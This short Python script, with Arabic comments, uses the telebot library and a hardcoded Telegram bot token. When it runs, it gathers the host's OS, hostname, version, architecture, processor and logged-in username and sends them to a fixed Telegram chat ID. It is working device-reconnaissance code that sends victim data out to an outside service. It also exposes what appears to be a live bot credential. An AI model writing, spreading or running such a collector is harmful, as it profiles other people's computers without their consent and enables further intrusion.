import telebot
import platform
import os

# استبدل بالتوكن الخاص بك
TOKEN = '7555358003:AAGr78GwcMIFJ03xpUPjpORvQ2wHfaXtK2M'
bot = telebot.TeleBot(TOKEN)

# وظيفة لجلب بيانات الجهاز
def get_device_data():
    device_data = {
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'User': os.getlogin()
    }
    return device_data

# إرسال البيانات إلى الأرقام المحددة
def send_data(chat_id):
    device_data = get_device_data()
    message = "\n".join([f"{key}: {value}" for key, value in device_data.items()])
    bot.send_message(chat_id, message)

# تحديد معرف الدردشة (chat_id) هنا
chat_id = '7243681318'  # استبدل بمعرف الدردشة المرغوب

# استدعاء الدالة لإرسال البيانات
send_data(chat_id)